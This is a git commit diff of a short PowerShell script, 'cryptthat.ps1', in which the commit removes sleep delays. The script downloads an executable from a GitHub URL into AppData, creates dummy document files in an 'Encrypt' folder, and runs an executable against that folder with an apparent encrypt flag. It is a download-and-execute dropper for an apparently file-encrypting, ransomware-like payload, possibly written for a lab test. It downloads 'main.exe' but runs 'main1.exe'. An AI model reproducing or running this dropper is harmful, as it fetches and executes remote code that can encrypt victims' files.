34e816869989f0d593b9ef4712c79d94068dbb34
Anvar Shakirov <ghostas6@gmail.com>
2022-11-21 20:36:50 +0300

    Update cryptthat.ps1

--- cryptthat.ps1
+++ cryptthat.ps1
@@ -1,10 +1,10 @@
 $localpath = 'C:\Users\VD` Winx64\AppData\Local'
 $WebClient = New-Object System.Net.WebClient
-Start-Sleep -s 5
+
 $WebClient.DownloadFile("https://github.com/ashakiro/test1/raw/main/main.exe","$localpath\main.exe")
-Start-Sleep -s 5
+
 
 New-Item -Path "C:\Users\VD Winx64\AppData\Local\Encrypt\PStxt.txt"
 New-Item -Path "C:\Users\VD Winx64\AppData\Local\Encrypt\PSdoc.doc"
-Start-Sleep -s 5
+
 powershell "$localpath\main1.exe" -p $localpath\Encrypt -e
